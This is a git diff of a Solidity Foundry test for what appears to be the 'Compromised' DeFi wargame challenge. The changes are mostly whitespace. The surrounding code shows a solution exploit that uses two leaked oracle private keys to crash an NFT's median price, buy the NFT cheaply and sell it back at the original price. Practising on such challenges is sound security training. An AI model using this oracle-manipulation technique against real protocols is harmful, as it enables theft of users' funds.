@@ -20,7 +20,6 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
@@ -74,11 +73,12 @@ contract CompromisedChallenge is Test {
     // uint256 rep of the private keys
     uint256 private constant PRIVATE_KEY_1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
     uint256 private constant PRIVATE_KEY_2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
     function setMedianPrice(uint256 amount) internal {
         // Get oracle addresses from private keys
         address oracle1 = vm.addr(PRIVATE_KEY_1);
         address oracle2 = vm.addr(PRIVATE_KEY_2);
-        
+
         console.log("Oracle 1 address:", oracle1);
         console.log("Oracle 2 address:", oracle2);
 
@@ -109,8 +109,10 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-           /** CODE YOUR EXPLOIT HERE */
-     // Set price to 0.01 ether
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+        // Set price to 0.01 ether
         uint256 priceToSet = 0.01 ether;
         setMedianPrice(priceToSet);
 
@@ -134,7 +136,7 @@ contract CompromisedChallenge is Test {
         nft.approve(address(exchange), tokenId);
         vm.prank(player);
         exchange.sellOne(tokenId);
-        
+
         // Reset oracle price
         setMedianPrice(INITIAL_NFT_PRICE);
 
